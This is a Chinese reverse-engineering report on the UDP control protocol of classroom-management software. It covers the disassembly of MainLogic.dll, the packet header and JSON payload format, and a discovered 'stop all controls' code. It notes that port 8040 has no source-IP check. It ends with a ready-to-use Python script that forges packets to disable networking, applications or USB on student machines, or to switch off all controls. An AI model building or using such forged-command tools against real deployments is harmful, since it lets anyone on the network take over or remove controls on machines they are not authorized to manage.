# 10 行为管控报文核查定稿（反汇编级复核）

> 本报告为"行为管控指令下发与接收"的**定稿**。方法：反汇编（非仅反编译）+ 三源交叉验证（本次 Ghidra 反汇编 / 你的仓库报告 / `skin/core.conf`）。
> **重要**：本报告纠正了 09 报告及你仓库 `NET_LIMIT_PAYLOAD_RESEARCH.md` 中关于 `/*//` 的**错误结论**。

## 一、⚠️ 关键纠偏：`/*//` 不是载荷前缀

### 证据（反汇编 `MainLogic.dll FUN_10064770`，type=500 发送）

```asm
100647b4  MOV [EBP-0x20],0x1f4      ; cmdType = 500
100647bb  MOV [EBP-0x1c],0x0        ; flag1 = 0
100647c2  MOV [EBP-0x18],0x0        ; flag2 = 0
100647e1  CALL 0x10012060           ; 取 this+0x548 长度 → local_18
100647f0  CALL 0x1003f850           ; 写16B头 [500][0][0][len]
10064804  CALL 0x100218a0           ; 追加载荷 = this+0x548（纯JSON）
10064811  PUSH 0x10152d38           ; ← "/*//"（已确认该地址内容为 /*//）
10064816  CALL 0x10008b40           ; 构造 "/*//" 字符串对象
10064825  CALL 0x10010110           ; 取 local_34 长度
1006482e  CALL 0x1000c1a0           ; 取 local_34 缓冲
1006483e  CALL 0x1009e070           ; ★ 发送 local_34（16B头 + JSON）
```

**结论**：`/*//` 在 `0x10064811` 被构造出来后，**从未被拼入 `local_34`（实际发送的缓冲）**。发送缓冲 = `[500][0][0][len]` + `this+0x548`。`/*//` 是编译器优化残留的**死代码**，**不是报文前缀**。

> 📌 你仓库 `NET_LIMIT_PAYLOAD_RESEARCH.md` 中"载荷 = `/*//` + JSON"的结论**作废**。

## 二、报文格式（定稿）

```
┌────────────── 16 字节固定头 ──────────────┐
│ [cmdType:u32][flag1:u32][flag2:u32][payloadLen:u32] │
└───────────────────────────────────────────┘
                    +  JSON 载荷
```

| 字段 | 值 | 说明 |
|---|---|---|
| `cmdType` | **500** | 行为管控（网络/应用/USB/键盘） |
| `flag1` | 0 | 固定 |
| `flag2` | 0 | 固定 |
| `payloadLen` | N | JSON 字节长度（不含结尾 `\0`） |
| 载荷 | JSON | 无 `/*//`、无其他前缀 |

## 三、载荷 JSON 结构

```json
{
  "CtrlCode": 19,
  "apps":  [{"app":"notepad","exec":"C:\\...\\notepad.exe","type":"black"}],
  "cites": [{"cite":"www.baidu.com","type":"black"}],
  "keys":  [{"keyName":"surf"}],
  "sendState": 1,
  "tipInfo": "上课请勿浏览与学习无关的网站！",
  "serverIp": "192.168.1.100"
}
```

| 位 | 值 | 管控 |
|---|---|---|
| bit0 | 0x01 | 禁用网络 |

## 五、★ 新发现：停止管控的 CtrlCode = `-0x44000000`

反编译 `MainLogic.dll` 导出 `UnLoad`（`FUN_10077970`）：

```c
FUN_1012c860(local_50, 0);            // 创建 JSON 对象
FUN_1012c7c0(local_60, -0x44000000);  // 整数值 = -0x44000000
FUN_1012d050(local_50, "CtrlCode");   // 键
FUN_1012cc70(this, piVar3);           // 赋值
FUN_1012ecb0(local_50, &stack_80);    // 序列化
FUN_10067f50(local_14);               // 存入 this+0x548 → 触发 type=500 发送
```

即**停止/清除全部管控** = 发送 `{"CtrlCode": -0x44000000}`（`0xBC000000`）。

## 七、无 IP 校验（core.conf 实锤）

```
/IpAddressFilter//     ← 空值 = 无来源 IP 过滤
/Limit/1/              ← 管控使能
/UdpMessageControllerPort/8040/
```

→ **任意局域网机器可直接构造报文发往学生机 8040**。

## 八、工具开发最小报文（可直接落地）

```python
import struct, json, socket

def build_ctrl(ctrl_code, host, port=8040, extra=None):
    payload_obj = {"CtrlCode": ctrl_code}
    if extra:
        payload_obj.update(extra)
    payload = json.dumps(payload_obj, separators=(',', ':')).encode('utf-8')
    hdr = struct.pack("<IIII", 500, 0, 0, len(payload))   # 无 /*// 前缀
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(hdr + payload, (host, port))
    s.close()

# 禁用网络
build_ctrl(0x01, "192.168.1.100")
# 禁用应用
build_ctrl(0x10, "192.168.1.100")
# 禁 USB
build_ctrl(0x100, "192.168.1.100")
# 全部停止（UnLoad 语义）
build_ctrl(-0x44000000, "192.168.1.100")
```

## 九、待动态验证（静态无法 100% 定案）

1. `apps`/`cites`/`keys` 数组元素的**精确字段名与 type 取值**（`black`/`white` 字符串还是 0/1）
2. `/encode` 接口是否对管控载荷加密（type=500 发送路径反汇编**未见加密调用**，但 Teacher 端另有 `/encode` 通道，需实测确认是否叠加）
3. `-0x44000000` 之外是否还有其他控制/停止值
4. 学生端是否在**更底层**（驱动/服务）还有一层来源校验
